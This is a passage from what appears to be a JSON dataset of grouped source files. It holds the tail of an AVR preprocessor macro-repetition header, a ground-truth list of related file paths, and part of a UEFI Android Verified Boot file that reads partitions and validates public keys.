data)       MREPEAT81( macro, data)   macro( 81, data)\n#define MREPEAT83( macro, data)       MREPEAT82( macro, data)   macro( 82, data)\n#define MREPEAT84( macro, data)       MREPEAT83( macro, data)   macro( 83, data)\n#define MREPEAT85( macro, data)       MREPEAT84( macro, data)   macro( 84, data)\n#define MREPEAT86( macro, data)       MREPEAT85( macro, data)   macro( 85, data)\n#define MREPEAT87( macro, data)       MREPEAT86( macro, data)   macro( 86, data)\n#define MREPEAT88( macro, data)       MREPEAT87( macro, data)   macro( 87, data)\n#define MREPEAT89( macro, data)       MREPEAT88( macro, data)   macro( 88, data)\n#define MREPEAT90( macro, data)       MREPEAT89( macro, data)   macro( 89, data)\n#define MREPEAT91( macro, data)       MREPEAT90( macro, data)   macro( 90, data)\n#define MREPEAT92( macro, data)       MREPEAT91( macro, data)   macro( 91, data)\n#define MREPEAT93( macro, data)       MREPEAT92( macro, data)   macro( 92, data)\n#define MREPEAT94( macro, data)       MREPEAT93( macro, data)   macro( 93, data)\n#define MREPEAT95( macro, data)       MREPEAT94( macro, data)   macro( 94, data)\n#define MREPEAT96( macro, data)       MREPEAT95( macro, data)   macro( 95, data)\n#define MREPEAT97( macro, data)       MREPEAT96( macro, data)   macro( 96, data)\n#define MREPEAT98( macro, data)       MREPEAT97( macro, data)   macro( 97, data)\n#define MREPEAT99( macro, data)       MREPEAT98( macro, data)   macro( 98, data)\n#define MREPEAT100(macro, data)       MREPEAT99( macro, data)   macro( 99, data)\n#define MREPEAT101(macro, data)       MREPEAT100(macro, data)   macro(100, data)\n#define MREPEAT102(macro, data)       MREPEAT101(macro, data)   macro(101, data)\n#define MREPEAT103(macro, data)       MREPEAT102(macro, data)   macro(102, data)\n#define MREPEAT104(macro, data)       MREPEAT103(macro, data)   macro(103, data)\n#define MREPEAT105(macro, data)       MREPEAT104(macro, data)   macro(104, data)\n#define MREPEAT106(macro, data)       MREPEAT105(macro, data)   macro(105, data)\n#define MREPEAT107(macro, data)       MREPEAT106(macro, data)   macro(106, data)\n#define MREPEAT108(macro, data)       MREPEAT107(macro, data)   macro(107, data)\n#define MREPEAT109(macro, data)       MREPEAT108(macro, data)   macro(108, data)\n#define MREPEAT110(macro, data)       MREPEAT109(macro, data)   macro(109, data)\n#define MREPEAT111(macro, data)       MREPEAT110(macro, data)   macro(110, data)\n#define MREPEAT112(macro, data)       MREPEAT111(macro, data)   macro(111, data)\n#define MREPEAT113(macro, data)       MREPEAT112(macro, data)   macro(112, data)\n#define MREPEAT114(macro, data)       MREPEAT113(macro, data)   macro(113, data)\n#define MREPEAT115(macro, data)       MREPEAT114(macro, data)   macro(114, data)\n#define MREPEAT116(macro, data)       MREPEAT115(macro, data)   macro(115, data)\n#define MREPEAT117(macro, data)       MREPEAT116(macro, data)   macro(116, data)\n#define MREPEAT118(macro, data)       MREPEAT117(macro, data)   macro(117, data)\n#define MREPEAT119(macro, data)       MREPEAT118(macro, data)   macro(118, data)\n#define MREPEAT120(macro, data)       MREPEAT119(macro, data)   macro(119, data)\n#define MREPEAT121(macro, data)       MREPEAT120(macro, data)   macro(120, data)\n#define MREPEAT122(macro, data)       MREPEAT121(macro, data)   macro(121, data)\n#define MREPEAT123(macro, data)       MREPEAT122(macro, data)   macro(122, data)\n#define MREPEAT124(macro, data)       MREPEAT123(macro, data)   macro(123, data)\n#define MREPEAT125(macro, data)       MREPEAT124(macro, data)   macro(124, data)\n#define MREPEAT126(macro, data)       MREPEAT125(macro, data)   macro(125, data)\n#define MREPEAT127(macro, data)       MREPEAT126(macro, data)   macro(126, data)\n#define MREPEAT128(macro, data)       MREPEAT127(macro, data)   macro(127, data)\n#define MREPEAT129(macro, data)       MREPEAT128(macro, data)   macro(128, data)\n#define MREPEAT130(macro, data)       MREPEAT129(macro, data)   macro(129, data)\n#define MREPEAT131(macro, data)       MREPEAT130(macro, data)   macro(130, data)\n#define MREPEAT132(macro, data)       MREPEAT131(macro, data)   macro(131, data)\n#define MREPEAT133(macro, data)       MREPEAT132(macro, data)   macro(132, data)\n#define MREPEAT134(macro, data)       MREPEAT133(macro, data)   macro(133, data)\n#define MREPEAT135(macro, data)       MREPEAT134(macro, data)   macro(134, data)\n#define MREPEAT136(macro, data)       MREPEAT135(macro, data)   macro(135, data)\n#define MREPEAT137(macro, data)       MREPEAT136(macro, data)   macro(136, data)\n#define MREPEAT138(macro, data)       MREPEAT137(macro, data)   macro(137, data)\n#define MREPEAT139(macro, data)       MREPEAT138(macro, data)   macro(138, data)\n#define MREPEAT140(macro, data)       MREPEAT139(macro, data)   macro(139, data)\n#define MREPEAT141(macro, data)       MREPEAT140(macro, data)   macro(140, data)\n#define MREPEAT142(macro, data)       MREPEAT141(macro, data)   macro(141, data)\n#define MREPEAT143(macro, data)       MREPEAT142(macro, data)   macro(142, data)\n#define MREPEAT144(macro, data)       MREPEAT143(macro, data)   macro(143, data)\n#define MREPEAT145(macro, data)       MREPEAT144(macro, data)   macro(144, data)\n#define MREPEAT146(macro, data)       MREPEAT145(macro, data)   macro(145, data)\n#define MREPEAT147(macro, data)       MREPEAT146(macro, data)   macro(146, data)\n#define MREPEAT148(macro, data)       MREPEAT147(macro, data)   macro(147, data)\n#define MREPEAT149(macro, data)       MREPEAT148(macro, data)   macro(148, data)\n#define MREPEAT150(macro, data)       MREPEAT149(macro, data)   macro(149, data)\n#define MREPEAT151(macro, data)       MREPEAT150(macro, data)   macro(150, data)\n#define MREPEAT152(macro, data)       MREPEAT151(macro, data)   macro(151, data)\n#define MREPEAT153(macro, data)       MREPEAT152(macro, data)   macro(152, data)\n#define MREPEAT154(macro, data)       MREPEAT153(macro, data)   macro(153, data)\n#define MREPEAT155(macro, data)       MREPEAT154(macro, data)   macro(154, data)\n#define MREPEAT156(macro, data)       MREPEAT155(macro, data)   macro(155, data)\n#define MREPEAT157(macro, data)       MREPEAT156(macro, data)   macro(156, data)\n#define MREPEAT158(macro, data)       MREPEAT157(macro, data)   macro(157, data)\n#define MREPEAT159(macro, data)       MREPEAT158(macro, data)   macro(158, data)\n#define MREPEAT160(macro, data)       MREPEAT159(macro, data)   macro(159, data)\n#define MREPEAT161(macro, data)       MREPEAT160(macro, data)   macro(160, data)\n#define MREPEAT162(macro, data)       MREPEAT161(macro, data)   macro(161, data)\n#define MREPEAT163(macro, data)       MREPEAT162(macro, data)   macro(162, data)\n#define MREPEAT164(macro, data)       MREPEAT163(macro, data)   macro(163, data)\n#define MREPEAT165(macro, data)       MREPEAT164(macro, data)   macro(164, data)\n#define MREPEAT166(macro, data)       MREPEAT165(macro, data)   macro(165, data)\n#define MREPEAT167(macro, data)       MREPEAT166(macro, data)   macro(166, data)\n#define MREPEAT168(macro, data)       MREPEAT167(macro, data)   macro(167, data)\n#define MREPEAT169(macro, data)       MREPEAT168(macro, data)   macro(168, data)\n#define MREPEAT170(macro, data)       MREPEAT169(macro, data)   macro(169, data)\n#define MREPEAT171(macro, data)       MREPEAT170(macro, data)   macro(170, data)\n#define MREPEAT172(macro, data)       MREPEAT171(macro, data)   macro(171, data)\n#define MREPEAT173(macro, data)       MREPEAT172(macro, data)   macro(172, data)\n#define MREPEAT174(macro, data)       MREPEAT173(macro, data)   macro(173, data)\n#define MREPEAT175(macro, data)       MREPEAT174(macro, data)   macro(174, data)\n#define MREPEAT176(macro, data)       MREPEAT175(macro, data)   macro(175, data)\n#define MREPEAT177(macro, data)       MREPEAT176(macro, data)   macro(176, data)\n#define MREPEAT178(macro, data)       MREPEAT177(macro, data)   macro(177, data)\n#define MREPEAT179(macro, data)       MREPEAT178(macro, data)   macro(178, data)\n#define MREPEAT180(macro, data)       MREPEAT179(macro, data)   macro(179, data)\n#define MREPEAT181(macro, data)       MREPEAT180(macro, data)   macro(180, data)\n#define MREPEAT182(macro, data)       MREPEAT181(macro, data)   macro(181, data)\n#define MREPEAT183(macro, data)       MREPEAT182(macro, data)   macro(182, data)\n#define MREPEAT184(macro, data)       MREPEAT183(macro, data)   macro(183, data)\n#define MREPEAT185(macro, data)       MREPEAT184(macro, data)   macro(184, data)\n#define MREPEAT186(macro, data)       MREPEAT185(macro, data)   macro(185, data)\n#define MREPEAT187(macro, data)       MREPEAT186(macro, data)   macro(186, data)\n#define MREPEAT188(macro, data)       MREPEAT187(macro, data)   macro(187, data)\n#define MREPEAT189(macro, data)       MREPEAT188(macro, data)   macro(188, data)\n#define MREPEAT190(macro, data)       MREPEAT189(macro, data)   macro(189, data)\n#define MREPEAT191(macro, data)       MREPEAT190(macro, data)   macro(190, data)\n#define MREPEAT192(macro, data)       MREPEAT191(macro, data)   macro(191, data)\n#define MREPEAT193(macro, data)       MREPEAT192(macro, data)   macro(192, data)\n#define MREPEAT194(macro, data)       MREPEAT193(macro, data)   macro(193, data)\n#define MREPEAT195(macro, data)       MREPEAT194(macro, data)   macro(194, data)\n#define MREPEAT196(macro, data)       MREPEAT195(macro, data)   macro(195, data)\n#define MREPEAT197(macro, data)       MREPEAT196(macro, data)   macro(196, data)\n#define MREPEAT198(macro, data)       MREPEAT197(macro, data)   macro(197, data)\n#define MREPEAT199(macro, data)       MREPEAT198(macro, data)   macro(198, data)\n#define MREPEAT200(macro, data)       MREPEAT199(macro, data)   macro(199, data)\n#define MREPEAT201(macro, data)       MREPEAT200(macro, data)   macro(200, data)\n#define MREPEAT202(macro, data)       MREPEAT201(macro, data)   macro(201, data)\n#define MREPEAT203(macro, data)       MREPEAT202(macro, data)   macro(202, data)\n#define MREPEAT204(macro, data)       MREPEAT203(macro, data)   macro(203, data)\n#define MREPEAT205(macro, data)       MREPEAT204(macro, data)   macro(204, data)\n#define MREPEAT206(macro, data)       MREPEAT205(macro, data)   macro(205, data)\n#define MREPEAT207(macro, data)       MREPEAT206(macro, data)   macro(206, data)\n#define MREPEAT208(macro, data)       MREPEAT207(macro, data)   macro(207, data)\n#define MREPEAT209(macro, data)       MREPEAT208(macro, data)   macro(208, data)\n#define MREPEAT210(macro, data)       MREPEAT209(macro, data)   macro(209, data)\n#define MREPEAT211(macro, data)       MREPEAT210(macro, data)   macro(210, data)\n#define MREPEAT212(macro, data)       MREPEAT211(macro, data)   macro(211, data)\n#define MREPEAT213(macro, data)       MREPEAT212(macro, data)   macro(212, data)\n#define MREPEAT214(macro, data)       MREPEAT213(macro, data)   macro(213, data)\n#define MREPEAT215(macro, data)       MREPEAT214(macro, data)   macro(214, data)\n#define MREPEAT216(macro, data)       MREPEAT215(macro, data)   macro(215, data)\n#define MREPEAT217(macro, data)       MREPEAT216(macro, data)   macro(216, data)\n#define MREPEAT218(macro, data)       MREPEAT217(macro, data)   macro(217, data)\n#define MREPEAT219(macro, data)       MREPEAT218(macro, data)   macro(218, data)\n#define MREPEAT220(macro, data)       MREPEAT219(macro, data)   macro(219, data)\n#define MREPEAT221(macro, data)       MREPEAT220(macro, data)   macro(220, data)\n#define MREPEAT222(macro, data)       MREPEAT221(macro, data)   macro(221, data)\n#define MREPEAT223(macro, data)       MREPEAT222(macro, data)   macro(222, data)\n#define MREPEAT224(macro, data)       MREPEAT223(macro, data)   macro(223, data)\n#define MREPEAT225(macro, data)       MREPEAT224(macro, data)   macro(224, data)\n#define MREPEAT226(macro, data)       MREPEAT225(macro, data)   macro(225, data)\n#define MREPEAT227(macro, data)       MREPEAT226(macro, data)   macro(226, data)\n#define MREPEAT228(macro, data)       MREPEAT227(macro, data)   macro(227, data)\n#define MREPEAT229(macro, data)       MREPEAT228(macro, data)   macro(228, data)\n#define MREPEAT230(macro, data)       MREPEAT229(macro, data)   macro(229, data)\n#define MREPEAT231(macro, data)       MREPEAT230(macro, data)   macro(230, data)\n#define MREPEAT232(macro, data)       MREPEAT231(macro, data)   macro(231, data)\n#define MREPEAT233(macro, data)       MREPEAT232(macro, data)   macro(232, data)\n#define MREPEAT234(macro, data)       MREPEAT233(macro, data)   macro(233, data)\n#define MREPEAT235(macro, data)       MREPEAT234(macro, data)   macro(234, data)\n#define MREPEAT236(macro, data)       MREPEAT235(macro, data)   macro(235, data)\n#define MREPEAT237(macro, data)       MREPEAT236(macro, data)   macro(236, data)\n#define MREPEAT238(macro, data)       MREPEAT237(macro, data)   macro(237, data)\n#define MREPEAT239(macro, data)       MREPEAT238(macro, data)   macro(238, data)\n#define MREPEAT240(macro, data)       MREPEAT239(macro, data)   macro(239, data)\n#define MREPEAT241(macro, data)       MREPEAT240(macro, data)   macro(240, data)\n#define MREPEAT242(macro, data)       MREPEAT241(macro, data)   macro(241, data)\n#define MREPEAT243(macro, data)       MREPEAT242(macro, data)   macro(242, data)\n#define MREPEAT244(macro, data)       MREPEAT243(macro, data)   macro(243, data)\n#define MREPEAT245(macro, data)       MREPEAT244(macro, data)   macro(244, data)\n#define MREPEAT246(macro, data)       MREPEAT245(macro, data)   macro(245, data)\n#define MREPEAT247(macro, data)       MREPEAT246(macro, data)   macro(246, data)\n#define MREPEAT248(macro, data)       MREPEAT247(macro, data)   macro(247, data)\n#define MREPEAT249(macro, data)       MREPEAT248(macro, data)   macro(248, data)\n#define MREPEAT250(macro, data)       MREPEAT249(macro, data)   macro(249, data)\n#define MREPEAT251(macro, data)       MREPEAT250(macro, data)   macro(250, data)\n#define MREPEAT252(macro, data)       MREPEAT251(macro, data)   macro(251, data)\n#define MREPEAT253(macro, data)       MREPEAT252(macro, data)   macro(252, data)\n#define MREPEAT254(macro, data)       MREPEAT253(macro, data)   macro(253, data)\n#define MREPEAT255(macro, data)       MREPEAT254(macro, data)   macro(254, data)\n#define MREPEAT256(macro, data)       MREPEAT255(macro, data)   macro(255, data)\n\n\n\n#endif\n",
        "gt": [
            "'EasyAVR/firmware/src/ASF/mega/utils/preprocessor/tpaste.h'",
            "'EasyAVR/firmware/src/ASF/mega/utils/preprocessor/preprocessor.h'",
            "'EasyAVR/firmware/src/ASF/mega/utils/preprocessor/mrepeat.h'"
        ]
    },
    {
        "files": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_ops.c'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_version.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/libavb.h'"
        ],
        "content": "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_ops.c'\n:\n\n\n\n#include \"Board.h\"\n#include \"BootLinux.h\"\n#include \"LinuxLoaderLib.h\"\n#include \"OEMPublicKey.h\"\n#include \"PartitionTableUpdate.h\"\n#include \"avb_sysdeps.h\"\n#include \"libavb.h\"\n#include <Library/BaseLib.h>\n#include <Library/BaseMemoryLib.h>\n#include <Library/DebugLib.h>\n#include <Library/MemoryAllocationLib.h>\n#include <Uefi.h>\n\nSTATIC AvbIOResult GetHandleInfo(const char *Partition, HandleInfo *HandleInfo)\n{\n\tEFI_STATUS Status = EFI_SUCCESS;\n\tCHAR16 UnicodePartition[MAX_GPT_NAME_SIZE] = {0};\n\tUINT32 BlkIOAttrib = 0;\n\tPartiSelectFilter HandleFilter = {0};\n\tUINT32 MaxHandles = 1;\n\n\tif ((AsciiStrLen(Partition) + 1) > ARRAY_SIZE(UnicodePartition)) {\n\t\tDEBUG((EFI_D_ERROR,\n\t\t       \"GetHandleInfo: Partition %a, name too large\\n\", Partition));\n\t\treturn AVB_IO_RESULT_ERROR_IO;\n\t}\n\n\tAsciiStrToUnicodeStrS(Partition, UnicodePartition, MAX_GPT_NAME_SIZE);\n\n\tHandleFilter.RootDeviceType = NULL;\n\tHandleFilter.PartitionLabel = NULL;\n\tHandleFilter.VolumeName = 0;\n\n\tBlkIOAttrib |= BLK_IO_SEL_PARTITIONED_MBR;\n\tBlkIOAttrib |= BLK_IO_SEL_PARTITIONED_GPT;\n\tBlkIOAttrib |= BLK_IO_SEL_MEDIA_TYPE_NON_REMOVABLE;\n\tBlkIOAttrib |= BLK_IO_SEL_MATCH_PARTITION_LABEL;\n\tHandleFilter.PartitionLabel = UnicodePartition;\n\n\tStatus = GetBlkIOHandles(BlkIOAttrib, &HandleFilter, HandleInfo, &MaxHandles);\n\n\tif (Status != EFI_SUCCESS) {\n\t\tDEBUG((EFI_D_ERROR,\n\t\t       \"GetHandleInfo: GetBlkIOHandles failed!\\n\"));\n\t\treturn AVB_IO_RESULT_ERROR_IO;\n\t}\n\n\tif (MaxHandles == 0) {\n\t\tDEBUG((EFI_D_ERROR, \"GetHandleInfo: No media!\\n\"));\n\t\treturn AVB_IO_RESULT_ERROR_NO_SUCH_PARTITION;\n\t}\n\n\tif (MaxHandles != 1) {\n\n\t\tDEBUG((EFI_D_ERROR, \"GetHandleInfo: More than one result!\\n\"));\n\t\treturn AVB_IO_RESULT_ERROR_IO;\n\t}\n\n\treturn AVB_IO_RESULT_OK;\n}\n\ntypedef struct {\n        CONST CHAR8 *Name;\n        EFI_GUID *Guid;\n}AvbPartitionDetails;\n\nAvbIOResult AvbReadFromPartition(AvbOps *Ops, const char *Partition, int64_t ReadOffset,\n                     size_t NumBytes, void *Buffer, size_t *OutNumRead)\n{\n\tAvbIOResult Result = AVB_IO_RESULT_OK;\n\tEFI_STATUS Status = EFI_SUCCESS;\n\tVOID *Page = NULL;\n        UINTN Offset = 0;\n\tHandleInfo InfoList[1];\n\tEFI_BLOCK_IO_PROTOCOL *BlockIo = NULL;\n\tUINTN PartitionSize = 0;\n\tUINT32 PageSize = 0;\n        UINT64 StartBlock = 0;\n        UINT64 LastBlock = 0;\n        UINT64 FullBlock = 0;\n        UINT64 StartPageReadSize = 0;\n        UINT64 LoadImageStartTime = GetTimerCountms ();\n\n\tif (Partition == NULL || Buffer == NULL || OutNumRead == NULL || NumBytes <= 0) {\n\t\tDEBUG((EFI_D_ERROR, \"bad input paramaters\\n\"));\n\t\tResult = AVB_IO_RESULT_ERROR_IO;\n\t\tgoto out;\n\t}\n\t*OutNumRead = 0;\n\n        Result = GetHandleInfo (Partition, InfoList);\n        if (Result != AVB_IO_RESULT_OK) {\n                DEBUG ((EFI_D_ERROR,\n                        \"AvbGetSizeOfPartition: GetHandleInfo failed\"));\n                goto out;\n        }\n\n\tBlockIo = InfoList[0].BlkIo;\n    PartitionSize = GetPartitionSize (BlockIo);\n    if (!PartitionSize) {\n      Result = AVB_IO_RESULT_ERROR_RANGE_OUTSIDE_PARTITION;\n      goto out;\n    }\n\n\tif (ReadOffset < 0) {\n\t\tif ((-ReadOffset) > PartitionSize) {\n\t\t\tDEBUG((EFI_D_ERROR,\n\t\t\t       \"Negative Offset outside range.\\n\"));\n\t\t\tResult = AVB_IO_RESULT_ERROR_RANGE_OUTSIDE_PARTITION;\n\t\t\tgoto out;\n\t\t}\n\t\tOffset = PartitionSize - (-ReadOffset);\n\t\tDEBUG((EFI_D_VERBOSE,\n\t\t       \"negative Offset (%d) converted to (%u) \\n\", ReadOffset, Offset));\n\t} else {\n\n\t\tOffset = ReadOffset;\n\t}\n\n\tif (Offset > PartitionSize) {\n\t\tDEBUG((EFI_D_ERROR, \"Offset outside range.\\n\"));\n\t\tResult = AVB_IO_RESULT_ERROR_RANGE_OUTSIDE_PARTITION;\n\t\tgoto out;\n\t}\n\n\tif (NumBytes > PartitionSize - Offset) {\n\t\tNumBytes = PartitionSize - Offset;\n\t}\n\n\tDEBUG((EFI_D_VERBOSE,\n\t       \"read from %a, 0x%x bytes at Offset 0x%x, partition size 0x%x\\n\",\n\t       Partition, NumBytes, Offset, PartitionSize));\n\n\n\tPageSize = BlockIo->Media->BlockSize;\n\tPage = avb_malloc(PageSize);\n\tif (Page == NULL) {\n\t\tDEBUG((EFI_D_ERROR, \"Allocate for partial read failed!\"));\n\t\tResult = AVB_IO_RESULT_ERROR_OOM;\n\t\tgoto out;\n\t}\n\n\tStartBlock = Offset / PageSize;\n\tLastBlock = (NumBytes + Offset) / PageSize;\n\tFullBlock = StartBlock;\n\tStartPageReadSize = 0;\n\n\tif (Offset % PageSize != 0) {\n\n                UINT64 StartPageReadOffset = Offset - (StartBlock * PageSize);\n\n\t\tif (StartBlock == LastBlock) {\n\n\t\t\tStartPageReadSize = NumBytes;\n\t\t} else {\n\t\t\tStartPageReadSize = PageSize - StartPageReadOffset;\n\t\t\tFullBlock++;\n\t\t}\n\n\t\tDEBUG((EFI_D_VERBOSE,\n                       \"StartBlock 0x%llx, ReadOffset 0x%llx, read_size 0x%x\\n\",\n\t\t       StartBlock, StartPageReadOffset, StartPageReadSize));\n\t\tif (StartPageReadSize <= 0 || StartPageReadOffset >= PageSize ||\n\t\t    StartPageReadSize > PageSize - StartPageReadOffset ||\n\t\t    StartPageReadSize > NumBytes ||\n\t\t    StartBlock > BlockIo->Media->LastBlock) {\n\t\t\tDEBUG((EFI_D_ERROR,\n                               \"StartBlock 0x%llx, ReadOffset 0x%llx,\"\n                                \"read_size 0x%x outside range.\\n\",\n\t\t\t       StartBlock, StartPageReadOffset, StartPageReadSize));\n\t\t\tResult = AVB_IO_RESULT_ERROR_RANGE_OUTSIDE_PARTITION;\n\t\t\tgoto out;\n\t\t}\n\n\t\tStatus = BlockIo->ReadBlocks(BlockIo, BlockIo->Media->MediaId,\n\t\t                             StartBlock, PageSize, Page);\n\t\tif (Status == EFI_SUCCESS) {\n\t\t\tavb_memcpy(Buffer, Page + StartPageReadOffset, StartPageReadSize);\n\t\t\t*OutNumRead += StartPageReadSize;\n\t\t} else {\n\t\t\t*OutNumRead = 0;\n\t\t\tDEBUG((EFI_D_ERROR, \"ReadBlocks failed %d\\n\", Status));\n\t\t\tgoto out;\n\t\t}\n\t}\n\n\tif (*OutNumRead < NumBytes && (NumBytes + Offset) % PageSize != 0) {\n\n\n                UINT64 LastPageReadOffset = 0;\n                UINT64 LastPageReadSize =\n                       (Offset + NumBytes) - (LastBlock * PageSize);\n\n\t\tDEBUG((EFI_D_VERBOSE,\n                       \"LastBlock 0x%llx, ReadOffset 0x%llx, read_size 0x%x\\n\",\n\t\t       LastBlock, LastPageReadOffset, LastPageReadSize));\n\n\t\tif (LastPageReadSize <= 0 || LastPageReadSize >= PageSize ||\n\t\t    LastPageReadSize > (NumBytes - *OutNumRead) ||\n\t\t    LastBlock > BlockIo->Media->LastBlock) {\n\t\t\tDEBUG((EFI_D_ERROR,\n                               \"LastBlock 0x%llx, ReadOffset 0x%llx, read_size \"\n\t\t\t       \"0x%x outside range.\\n\",\n\t\t\t       LastBlock, LastPageReadOffset, LastPageReadSize));\n\t\t\tResult = AVB_IO_RESULT_ERROR_RANGE_OUTSIDE_PARTITION;\n\t\t\tgoto out;\n\t\t}\n\n\t\tStatus = BlockIo->ReadBlocks(BlockIo, BlockIo->Media->MediaId,\n\t\t                             LastBlock, PageSize, Page);\n\t\tif (Status == EFI_SUCCESS) {\n\t\t\tavb_memcpy(Buffer + (NumBytes - LastPageReadSize), Page,\n\t\t\t           LastPageReadSize);\n\t\t\t*OutNumRead += LastPageReadSize;\n\t\t} else {\n\t\t\t*OutNumRead = 0;\n\t\t\tDEBUG((EFI_D_ERROR, \"ReadBlocks failed %d\\n\", Status));\n\t\t\tgoto out;\n\t\t}\n\t}\n\n\tif (*OutNumRead < NumBytes) {\n\n                UINT64 FillPageReadSize = NumBytes - *OutNumRead;\n\n\t\tif ((FillPageReadSize % PageSize) != 0 ||\n\t\t    FullBlock > BlockIo->Media->LastBlock ||\n\t\t    (NumBytes - StartPageReadSize) < FillPageReadSize) {\n\t\t\tDEBUG((EFI_D_ERROR,\n                               \"FullBlock 0x%llx, ReadOffset 0x%x, read_size \"\n\t\t\t       \"0x%x outside range.\\n\",\n\t\t\t       FullBlock, 0, FillPageReadSize));\n\t\t\tResult = AVB_IO_RESULT_ERROR_RANGE_OUTSIDE_PARTITION;\n\t\t\tgoto out;\n\t\t}\n\t\tStatus = BlockIo->ReadBlocks(BlockIo, BlockIo->Media->MediaId,\n\t\t                             FullBlock, FillPageReadSize,\n\t\t                             Buffer + StartPageReadSize);\n\t\tif (Status == EFI_SUCCESS) {\n\t\t\t*OutNumRead += FillPageReadSize;\n\t\t} else {\n\t\t\t*OutNumRead = 0;\n\t\t\tDEBUG((EFI_D_ERROR, \"ReadBlocks failed %d\\n\", Status));\n\t\t\tgoto out;\n\t\t}\n\t}\n\nout:\n\tif (Page != NULL) {\n\t\tavb_free(Page);\n\t}\n\n    DEBUG ((EFI_D_INFO, \"Load Image %a total time: %lu ms \\n\",\n          Partition, GetTimerCountms () - LoadImageStartTime));\n\treturn Result;\n}\n\nAvbIOResult AvbWriteToPartition(AvbOps *Ops, const char *Partition, int64_t Offset,\n                                size_t NumBytes, const void *Buffer)\n{\n\n\treturn AVB_IO_RESULT_ERROR_IO;\n}\n\nAvbIOResult\nAvbValidateVbmetaPublicKey(AvbOps *Ops, const uint8_t *PublicKeyData,\n                           size_t PublicKeyLength, const uint8_t *PublicKeyMetadata,\n                           size_t PublicKeyMetadataLength, bool *OutIsTrusted)\n{\n\tCHAR8 *UserKeyBuffer = NULL;\n\tUINT32 UserKeyLength = 0;\n\tEFI_STATUS Status = EFI_SUCCESS;\n\tAvbOpsUserData *UserData = NULL;\n\n\tDEBUG((EFI_D_VERBOSE, \"ValidateVbmetaPublicKey PublicKeyLength %d, \"\n\t                      \"PublicKeyMetadataLength %d\\n\",\n\t       PublicKeyLength, PublicKeyMetadataLength));\n\n\tif (OutIsTrusted == NULL || PublicKeyData == NULL) {\n\t\tDEBUG((EFI_D_ERROR, \"Invalid parameters\\n\"));\n\t\treturn AVB_IO_RESULT_ERROR_IO;\n\t}\n\n\tStatus = GetUserKey(&UserKeyBuffer, &UserKeyLength);\n\tif (Status != EFI_SUCCESS) {\n\t\tDEBUG((EFI_D_ERROR, \"GetUserKey failed!, %r\\n\", Status));\n\t\treturn AVB_IO_RESULT_ERROR_IO;\n\t}\n\n\tUserData = (AvbOpsUserData *)Ops->user_data;\n\tUserData->IsUserKey = FALSE;\n\n\tif (PublicKeyLength == UserKeyLength &&\n\t    CompareMem(PublicKeyData, UserKeyBuffer, PublicKeyLength) == 0) {\n\t\t*OutIsTrusted = true;\n\t\tUserData->IsUserKey = TRUE;\n\t} else if (PublicKeyLength == ARRAY_SIZE(OEMPublicKey) &&\n\t           CompareMem(PublicKeyData, OEMPublicKey, PublicKeyLength) == 0) {\n\t\t*OutIsTrusted = true;\n\t} else {\n\t\t*OutIsTrusted = false;\n\t\tSetMem(UserData->PublicKey, ARRAY_SIZE(UserData->PublicKey), 0);\n\t\tUserData->PublicKeyLen = 0;\n\t}\n\n\tif (*OutIsTrusted == true) {\n\t\tif (PublicKeyLength > ARRAY_SIZE(UserData->PublicKey)) {\n\t\t\tDEBUG((EFI_D_ERROR, \"ValidateVbmetaPublicKey: \"\n\t\t\t                    \"public key length too large %d\\n\",\n\t\t\t       PublicKeyLength));\n\t\t\treturn AVB_IO_RESULT_ERROR_OOM;\n\t\t}\n\t\tCopyMem(UserData->PublicKey, PublicKeyData, PublicKeyLength);\n\t\tUserData->PublicKeyLen = PublicKeyLength;\n\t}\n\tDEBUG((EFI_D_VERBOSE,\n\t       \"ValidateVbmetaPublicKey OutIsTrusted %d, UserKey %d\\n\",\n\t       *OutIsTrusted, UserData->IsUserKey));\n\treturn AVB_IO_RESULT_OK;\n}\n\n\nAvbIOResult\nAvbValidatePartitionPublicKey(AvbOps *Ops, const char* Partition,\n                           const uint8_t *PublicKeyData, size_t PublicKeyLength,\n                           const uint8_t *PublicKeyMetadata, size_t PublicKeyMetadataLength,\n                           bool *OutIsTrusted, uint32_t* OutRollbackIndexLocation)\n{\n        CHAR8 *UserKeyBuffer = NULL;\n        UINT32 UserKeyLength = 0;\n        EFI_STATUS Status = EFI_SUCCESS;\n        AvbOpsUserData *UserData = NULL;\n\n\tDEBUG((EFI_D_VERBOSE, \"ValidatePartitionPublicKey PublicKeyLength %d, \"\n\t                      \"PublicKeyMetadataLength %d\\n\",\n\t       PublicKeyLength, PublicKeyMetadataLength));\n\n\tif (OutIsTrusted == NULL || PublicKeyData == NULL) {\n\t\tDEBUG((EFI_D_ERROR, \"Invalid parameters\\n\"));\n\t\treturn AVB_IO_RESULT_ERROR_IO;\n\t}\n\n        Status = GetUserKey (&UserKeyBuffer, &UserKeyLength);\n        if (Status != EFI_SUCCESS) {\n                DEBUG ( (EFI_D_ERROR, \"GetUserKey failed!, %r\\n\", Status));\n                return AVB_IO_RESULT_ERROR_IO;\n        }\n\n        UserData = (AvbOpsUserData *)Ops->user_data;\n        UserData->IsUserKey = FALSE;\n\n        if (PublicKeyLength == UserKeyLength &&\n            CompareMem (PublicKeyData, UserKeyBuffer, PublicKeyLength) == 0) {\n                *OutIsTrusted = true;\n                UserData->IsUserKey = TRUE;\n        } else if (PublicKeyLength == ARRAY_SIZE (OEMPublicKey) &&\n\t           CompareMem(PublicKeyData, OEMPublicKey, PublicKeyLength) == 0) {\n\t\t*OutIsTrusted = true;\n\t} else {\n\t\t*OutIsTrusted = false;\n                SetMem (UserData->PublicKey,\n                   ARRAY_SIZE (UserData->PublicKey), 0);\n                UserData->PublicKeyLen = 0;\n\t}\n\n        if (*OutIsTrusted == true) {\n                if (PublicKeyLength > ARRAY_SIZE (UserData->PublicKey)) {\n                        DEBUG ( (EFI_D_ERROR, \"ValidatePartitionPublicKey: \"\n                                            \"public key length too large %d\\n\",\n                               PublicKeyLength));\n                        return AVB_IO_RESULT_ERROR_OOM;\n                }\n                CopyMem (UserData->PublicKey, PublicKeyData, PublicKeyLength);\n                UserData->PublicKeyLen = PublicKeyLength;\n        }\n\n\t*OutRollbackIndexLocation = 1;\n        DEBUG ( (EFI_D_VERBOSE,\n               \"ValidatePartitionPublicKey OutIsTrusted %d, UserKey %d\\n\",\n               *OutIsTrusted, UserData->IsUserKey));\n\treturn AVB_IO_RESULT_OK;\n}\n\nAvbIOResult 